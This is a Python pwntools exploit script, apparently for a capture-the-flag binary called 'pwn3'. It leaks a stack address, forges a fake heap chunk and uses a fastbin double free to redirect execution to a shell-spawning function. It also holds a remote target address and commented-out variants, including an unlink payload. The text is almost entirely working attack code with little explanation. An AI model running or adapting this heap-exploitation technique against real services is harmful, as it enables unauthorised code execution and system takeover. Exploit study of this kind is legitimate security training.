#!/usr/bin/python
DEBUG = 1
from pwn import *
from struct import *
pwn3 = ELF('./pwn3')
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
def create(p,num, length, content):
    p.recvuntil('delete paper')
    p.sendline('1')
    p.recvuntil('(0-9)')
    p.sendline(str(num))
    p.recvuntil('enter:')
    p.sendline(str(length))
    try:
        p.recvuntil('content:')      
    except:
        return False  
    p.sendline(content)
    p.recvuntil("success")
    return True
def delete(p,num):
    p.recvuntil('delete paper')
    p.sendline('2')
    p.recvuntil('(0-9)')
    p.sendline(str(num))
    p.recvuntil("success")
def secret(p,number):
    p.recvuntil('delete paper')
    p.sendline('3')
    p.recvuntil('number:')
    p.sendline(str(number))
def exp():
    p = process("./pwn3")
    #p = remote('47.104.16.75',8999)
    p.recvuntil('delete paper')
    p.sendline('x' * 0x31)
    p.recvuntil('input')
    p.sendline('x' * 0x31)
    p.recvuntil('x' * 0x30)
    leak = u64(p.recv (6)+"\0\0")
    #printf end with not-zero leak stack_addr 
    print "leak:" + hex(leak)
    #addr of fake-chunk
    #we can control chunk_size(chunk+8) with secret_key
    chunk = leak + 0x60
    print "fake_chunk:" + hex(chunk)
    if DEBUG:
        pause()
    p.sendline('4')
    #set fake-chunk size
    secret(p,0x21)
    #create fastbin
    create(p,1,0x10,'AAAA')
    create(p,2,0x10,'BBBB')
    #free them
    delete(p,1)
    delete(p,2)
    delete(p,1)
    #now the new chunk will set on chunk
    create(p,3,0x10,p64(chunk))
    create(p,4,0x10,'CCCC')
    create(p,5,0x10,'DDDD')
    #fill chunk with get_shell_func
    if False == create(p,6,0x10, 'A' * 8 + p64(0x400943)):
        return False
    p.recvuntil('delete paper')
    p.sendline('4')
    p.interactive()
    return True

c = exp()
while c==False:
    c = exp()

'''
def exp():
    #p = process("./pwn3")
    p = remote('47.104.16.75',8999)
    secret(p,0x21)
    create(p,1,0x10,'AAAA')
    create(p,2,0x10,'BBBB')
    delete(p,1)
    delete(p,2)
    delete(p,1)
    b = create(p,3,0x10,p64(0x7FFFFFFFE250))
    if b == False:
        p.close()
        return False
    create(p,4,0x10,'CCCC')
    create(p,5,0x10,'DDDD')
    create(p,3,0x10,'A' * 8 + p64(0x400943))
    try:
        p.recvuntil('delete paper')
    except:
        p.close()
        return False
    p.sendline('3')
    p.interactive()
    return True
'''
#double free doesn't fit
p_addr = 0x6020D0
'''create(2,0x100,'BBBB')
create(1,0x100,'CCCC')
pause()
delete(2)
delete(1)
payload = p64(0) + p64(0x101) + p64(p_addr-0x18) + p64(p_addr-0x10) + 'A'* (0x100-32) + p64(0x100) + p64(0x210-0x100)
create(3,0x210,payload)
log.info("go delete");
pause()
delete(1)
pause()
delete(2)
p.interactive()
exit()'''



